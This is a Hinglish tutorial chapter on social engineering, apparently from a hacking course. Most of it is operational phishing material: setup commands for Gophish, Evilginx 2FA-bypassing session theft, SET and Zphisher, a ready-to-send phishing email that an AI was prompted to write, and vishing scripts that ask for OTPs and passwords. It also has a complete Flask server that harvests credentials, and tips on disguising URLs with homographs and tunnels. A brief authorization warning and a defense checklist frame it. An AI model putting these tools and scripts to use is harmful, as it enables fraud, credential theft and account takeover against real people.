# 🎭 Phase 8 — Social Engineering: The Human Exploit

> **"Amateurs hack systems. Professionals hack people."** 
> Technical security kitni bhi strong ho, agar insaan kamzor hai toh sab bypass ho jaata hai.

> [!CAUTION]
> Social engineering sirf **authorized assessments** mein karo.
> Real logo pe bina permission = fraud, identity theft = **SERIOUS CRIME**

---

## 🧠 Psychology of Social Engineering

```
WHY SOCIAL ENGINEERING WORKS:
├── Authority    → "I'm from IT, I need your password"
├── Urgency      → "Your account will be locked in 5 minutes!"
├── Fear         → "We detected unauthorized access"
├── Curiosity    → "Look at this photo of you!"
├── Greed        → "You won ₹50 lakh lottery!"
├── Trust        → "I'm calling from your bank"
├── Helpfulness  → "Can you help me access the system?"
└── Reciprocity  → "I helped you, now help me"
```

---

## 🎣 Phishing — AI-Powered

### Modern Phishing Framework (Gophish)

```bash
# ═══════════════════════════════════════════════
# Gophish — Professional phishing platform
# ═══════════════════════════════════════════════

# Install
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-*.zip -d gophish
cd gophish
chmod +x gophish
sudo ./gophish

# Access admin panel: https://localhost:3333
# Default: admin / gophish (change immediately!)

# Workflow:
# 1. Create "Sending Profile" (SMTP server)
# 2. Create "Email Template" (phishing email)
# 3. Create "Landing Page" (fake login page)
# 4. Create "Users & Groups" (targets)
# 5. Launch "Campaign"
# 6. Track results (who clicked, who submitted)
```

### AI-Enhanced Phishing Emails

```
USE AI TO WRITE CONVINCING PHISHING EMAILS:

Prompt to AI:
"Write a professional IT department email notifying employees 
about a mandatory password reset due to a security incident. 
Include a link to reset password. Make it sound urgent but 
professional. Company name: XYZ Corp."

AI generates:
─────────────────────────────────────────────
Subject: [URGENT] Mandatory Password Reset Required — Security Incident

Dear Employee,

Our security team has detected unusual activity on our network 
infrastructure. As a precautionary measure, all employees are 
required to reset their passwords immediately.

Please reset your password using the secure portal below:
🔗 [Reset Password Now](http://YOUR_PHISHING_LINK)

This must be completed within 24 hours. Failure to comply may 
result in temporary account suspension.

If you have any questions, contact helpdesk@xyzcorp.com.

Best regards,
IT Security Team
XYZ Corporation
─────────────────────────────────────────────
```

### Evilginx — Advanced Phishing (Bypasses 2FA!)

```bash
# ═══════════════════════════════════════════════
# Evilginx = Reverse proxy phishing framework
# Acts as man-in-the-middle between victim and real site
# Captures session tokens (bypasses 2FA!)
# ═══════════════════════════════════════════════

# Install
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo ./bin/evilginx

# Inside Evilginx:
: config domain yourdomain.com
: config ipv4 YOUR_SERVER_IP
: phishlets hostname microsoft365 login.yourdomain.com
: phishlets enable microsoft365
: lures create microsoft365
: lures get-url 0

# Send the lure URL to target
# Victim logs in → Evilginx captures session cookie
# You can use the cookie to access their account!

# This bypasses:
# ✅ SMS 2FA
# ✅ Authenticator app 2FA
# ✅ Push notification 2FA
# ❌ Hardware keys (FIDO2/WebAuthn) — can't bypass these!
```

---

## 📞 Vishing (Voice Phishing)

```
VISHING SCENARIOS (authorized testing only):

1. IT SUPPORT SCAM:
   "Hi, this is John from IT support. We're seeing some 
   unusual activity on your computer. I need to remotely 
   connect to verify your system is secure. Can you install 
   this remote access tool?"

2. BANK VERIFICATION:
   "This is a security call from your bank. We detected 
   an unauthorized transaction of ₹50,000. To block this, 
   I need to verify your identity. What's your account 
   number and the OTP you just received?"

3. HELPDESK PRETEXTING:
   "Hi, I'm calling about your ticket #47291. To resolve 
   the VPN issue, I'll need your current password so I can 
   test the connection from our end."

TOOLS:
- SpoofCard — Caller ID spoofing
- Social Engineering Toolkit (SET) → Spear phishing
- AI voice cloning tools (for awareness training)
```

---

## 🌐 Credential Harvesting Tools

```bash
# ═══════════════════════════════════════════════
# Method 1: SET Credential Harvester
# ═══════════════════════════════════════════════
sudo setoolkit
# 1 → Social Engineering
# 2 → Website Attack Vectors  
# 3 → Credential Harvester
# 2 → Site Cloner
# Enter YOUR IP → Enter target URL

# ═══════════════════════════════════════════════
# Method 2: Zphisher (30+ templates!)
# ═══════════════════════════════════════════════
git clone https://github.com/htr-tech/zphisher.git
cd zphisher && bash zphisher.sh

# Templates: Instagram, Facebook, Google, Snapchat,
# Netflix, PayPal, LinkedIn, WordPress, and more!
# Auto-generates ngrok/cloudflared tunnel

# ═══════════════════════════════════════════════
# Method 3: Custom Flask phishing server
# ═══════════════════════════════════════════════
```

```python
#!/usr/bin/env python3
"""Custom phishing server — captures credentials"""
from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Sign In - Secure Login</title></head>
<body style="display:flex;justify-content:center;align-items:center;height:100vh;
             background:#f1f3f4;font-family:Arial;">
<div style="background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:400px;">
    <h2 style="text-align:center;">Sign In</h2>
    <form method="POST" action="/login">
        <input type="email" name="email" placeholder="Email" required
               style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;">
        <input type="password" name="password" placeholder="Password" required
               style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;">
        <button type="submit" 
                style="width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px;">
            Sign In
        </button>
    </form>
</div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Log captured credentials
    with open('captured_creds.txt', 'a') as f:
        f.write(f"Email: {email} | Password: {password} | IP: {request.remote_addr}\n")
    
    print(f"[+] CAPTURED: {email}:{password}")
    
    # Redirect to real site (victim thinks login failed)
    return redirect("https://accounts.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

---

## 🔗 URL Shortening & Masking

```bash
# Make phishing links look legitimate

# Method 1: URL shorteners
# bit.ly, tinyurl.com, is.gd

# Method 2: URL masking with @ symbol
# http://google.com@YOUR_IP
# Browser goes to YOUR_IP, but URL shows google.com!

# Method 3: IDN Homograph attack
# Use unicode characters that LOOK like real letters
# аpple.com (Cyrillic 'а') vs apple.com (Latin 'a')
# They look identical but go to different servers!

# Method 4: Custom domain
# Buy a similar domain: g00gle-security.com
# Or: google-verify.com
# Or: accounts-google.com

# Method 5: Ngrok (free tunnel)
ngrok http 80
# Gives you: https://abc123.ngrok.io
# Professional looking HTTPS link!

# Method 6: Cloudflared tunnel (free, looks more legit)
cloudflared tunnel --url http://localhost:80
```

---

## 🎥 Phase 8 Videos

```
1. "Social Engineering Attacks" — TCM Security (Full Course)
   https://www.youtube.com/watch?v=6q5RJPKr498

2. "Phishing Tutorial with Gophish" — David Bombal
   https://www.youtube.com/watch?v=S6S5JF6Gou0

3. "How Hackers Use Social Engineering" — DEFCON Talk
   https://www.youtube.com/watch?v=lc7scxvKQOo

4. "Evilginx — Bypass 2FA" — John Hammond
   https://www.youtube.com/watch?v=sZ8cBXMezKY

5. "The Art of Social Engineering" — Christopher Hadnagy (TEDx)
   https://www.youtube.com/watch?v=yY-lMkeZvuY

6. "SET Tutorial" — HackerSploit
   https://www.youtube.com/watch?v=2WoBEvjFzag

7. Book: "The Art of Deception" — Kevin Mitnick (MUST READ!)
```

---

## ✅ Phase 8 Checklist

```
PHISHING
[ ] Can create convincing phishing emails with AI
[ ] Can use Gophish for campaigns
[ ] Can clone websites for credential harvesting
[ ] Know about Evilginx for 2FA bypass
[ ] Can use URL masking techniques

SOCIAL ENGINEERING
[ ] Understand 8 psychological principles
[ ] Can plan pretexting scenarios
[ ] Know vishing techniques
[ ] Can write social engineering reports

DEFENSE
[ ] Can train employees on SE awareness
[ ] Can identify phishing indicators
[ ] Know how to implement anti-phishing controls
[ ] Understand why hardware keys beat all 2FA
```

---

> **Phase 8 done? → [Phase 9 — Advanced Techniques](./Phase9_Advanced.md)** 🔬
